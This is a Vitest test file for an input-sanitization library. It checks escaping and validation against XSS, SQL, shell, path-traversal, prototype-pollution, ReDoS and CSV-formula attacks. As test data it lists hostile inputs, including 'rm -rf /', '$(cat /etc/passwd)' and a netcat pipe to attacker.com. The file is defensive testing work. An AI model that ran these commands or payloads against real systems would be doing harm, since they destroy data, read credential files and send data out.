/**
 * Tests for Input Sanitization
 */

import { describe, it, expect } from 'vitest';
import {
  escapeHtml,
  stripHtmlTags,
  escapeSqlString,
  validateSqlIdentifier,
  escapeShellArg,
  sanitizeFilePath,
  validateFilename,
  sanitizeUrl,
  validateRedirectUrl,
  sanitizeJson,
  sanitizeEmail,
  validateRegexPattern,
  sanitizeCsvCell,
} from '../../src/security/sanitizers.js';

describe('HTML/XSS Sanitization', () => {
  it('should escape HTML special characters', () => {
    expect(escapeHtml('<script>alert("xss")</script>'))
      .toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');

    expect(escapeHtml('<img src=x onerror=alert(1)>'))
      .toBe('&lt;img src=x onerror=alert(1)&gt;');

    expect(escapeHtml("'onclick=alert(1)'"))
      .toBe('&#x27;onclick=alert(1)&#x27;');
  });

  it('should strip HTML tags', () => {
    expect(stripHtmlTags('<p>Hello <b>World</b></p>'))
      .toBe('Hello World');

    expect(stripHtmlTags('<script>alert("xss")</script>'))
      .toBe('alert("xss")');
  });

  it('should prevent XSS in various forms', () => {
    const xssAttempts = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
    ];

    xssAttempts.forEach(attempt => {
      const escaped = escapeHtml(attempt);
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('onerror');
      expect(escaped).not.toContain('onload');
    });
  });
});

describe('SQL Injection Prevention', () => {
  it('should escape SQL strings', () => {
    expect(escapeSqlString("O'Reilly")).toBe("O''Reilly");
    expect(escapeSqlString("'; DROP TABLE users; --")).toBe("''; DROP TABLE users; --");
  });

  it('should validate SQL identifiers', () => {
    expect(validateSqlIdentifier('users')).toBe(true);
    expect(validateSqlIdentifier('user_id')).toBe(true);
    expect(validateSqlIdentifier('_private')).toBe(true);

    expect(validateSqlIdentifier('123invalid')).toBe(false);
    expect(validateSqlIdentifier('user-id')).toBe(false);
    expect(validateSqlIdentifier('user.id')).toBe(false);
    expect(validateSqlIdentifier("'; DROP TABLE users; --")).toBe(false);
  });

  it('should prevent SQL injection attempts', () => {
    const injectionAttempts = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users--",
    ];

    injectionAttempts.forEach(attempt => {
      expect(validateSqlIdentifier(attempt)).toBe(false);
    });
  });
});

describe('Command Injection Prevention', () => {
  it('should escape shell arguments', () => {
    if (process.platform !== 'win32') {
      expect(escapeShellArg("test")).toBe("'test'");
      expect(escapeShellArg("test'arg")).toBe("'test'\\''arg'");
      expect(escapeShellArg("$(whoami)")).toBe("'$(whoami)'");
    }
  });

  it('should prevent command injection', () => {
    const injectionAttempts = [
      '; rm -rf /',
      '`whoami`',
      '$(cat /etc/passwd)',
      '&& echo pwned',
      '| nc attacker.com 1234',
    ];

    injectionAttempts.forEach(attempt => {
      const escaped = escapeShellArg(attempt);
      // Escaped version should not execute commands
      expect(escaped).toContain(attempt);
      expect(escaped).toMatch(/^['"].*['"]$/); // Wrapped in quotes
    });
  });
});

describe('Path Traversal Prevention', () => {
  it('should sanitize file paths', () => {
    expect(() => sanitizeFilePath('valid/path/file.txt')).not.toThrow();
    expect(() => sanitizeFilePath('../../../etc/passwd')).toThrow('traversal');
    expect(() => sanitizeFilePath('/etc/passwd', '/home/user')).toThrow('outside');
  });

  it('should validate filenames', () => {
    expect(validateFilename('document.pdf')).toBe(true);
    expect(validateFilename('my-file_123.txt')).toBe(true);

    expect(validateFilename('../etc/passwd')).toBe(false);
    expect(validateFilename('path/to/file')).toBe(false);
    expect(validateFilename('file\0name')).toBe(false);
  });

  it('should prevent directory traversal', () => {
    const traversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      'test/../../../secret',
    ];

    traversalAttempts.forEach(attempt => {
      expect(() => sanitizeFilePath(attempt)).toThrow();
    });
  });
});

describe('URL Sanitization', () => {
  it('should sanitize valid URLs', () => {
    expect(() => sanitizeUrl('https://example.com')).not.toThrow();
    expect(() => sanitizeUrl('http://example.com/path')).not.toThrow();
  });

  it('should reject dangerous protocols', () => {
    expect(() => sanitizeUrl('javascript:alert(1)')).toThrow();
    expect(() => sanitizeUrl('file:///etc/passwd')).toThrow();
    expect(() => sanitizeUrl('data:text/html,<script>alert(1)</script>')).toThrow();
  });

  it('should validate redirect URLs', () => {
    const allowedDomains = ['example.com', 'trusted.com'];

    expect(validateRedirectUrl('https://example.com/path', allowedDomains)).toBe(true);
    expect(validateRedirectUrl('https://evil.com', allowedDomains)).toBe(false);
    expect(validateRedirectUrl('javascript:alert(1)', allowedDomains)).toBe(false);
  });
});

describe('JSON Sanitization', () => {
  it('should sanitize safe JSON', () => {
    const input = { name: 'test', value: 123 };
    const output = sanitizeJson(input);
    expect(output).toEqual(input);
  });

  it('should remove prototype pollution keys', () => {
    const malicious = {
      name: 'test',
      __proto__: { polluted: true },
      constructor: { polluted: true },
      prototype: { polluted: true },
    };

    const sanitized = sanitizeJson(malicious);
    expect(sanitized).toEqual({ name: 'test' });
    expect(sanitized).not.toHaveProperty('__proto__');
    expect(sanitized).not.toHaveProperty('constructor');
    expect(sanitized).not.toHaveProperty('prototype');
  });

  it('should sanitize nested objects', () => {
    const malicious = {
      safe: {
        __proto__: { polluted: true },
        data: 'value',
      },
    };

    const sanitized = sanitizeJson(malicious);
    expect(sanitized).toEqual({ safe: { data: 'value' } });
  });
});

describe('Email Sanitization', () => {
  it('should sanitize valid emails', () => {
    expect(sanitizeEmail('user@example.com')).toBe('user@example.com');
    expect(sanitizeEmail('  User@Example.COM  ')).toBe('user@example.com');
  });

  it('should reject invalid emails', () => {
    expect(() => sanitizeEmail('invalid')).toThrow();
    expect(() => sanitizeEmail('user@')).toThrow();
    expect(() => sanitizeEmail('@example.com')).toThrow();
    expect(() => sanitizeEmail('user@example')).toThrow();
  });
});

describe('RegEx DoS Prevention', () => {
  it('should validate safe regex patterns', () => {
    expect(validateRegexPattern('^[a-z]+$')).toBe(true);
    expect(validateRegexPattern('\\d{3}-\\d{3}-\\d{4}')).toBe(true);
  });

  it('should detect dangerous regex patterns', () => {
    expect(validateRegexPattern('(a+)+(b+)+(c+)+')).toBe(false);
    expect(validateRegexPattern('(a*)*')).toBe(false);
    expect(validateRegexPattern('(a{1,10}){1,10}')).toBe(false);
  });
});

describe('CSV Injection Prevention', () => {
  it('should sanitize CSV cells', () => {
    expect(sanitizeCsvCell('normal text')).toBe('normal text');
    expect(sanitizeCsvCell('text with "quotes"')).toBe('text with ""quotes""');
  });

  it('should prevent CSV formula injection', () => {
    expect(sanitizeCsvCell('=1+1')).toBe("'=1+1");
    expect(sanitizeCsvCell('+1+1')).toBe("'+1+1");
    expect(sanitizeCsvCell('-1+1')).toBe("'-1+1");
    expect(sanitizeCsvCell('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");
  });
});
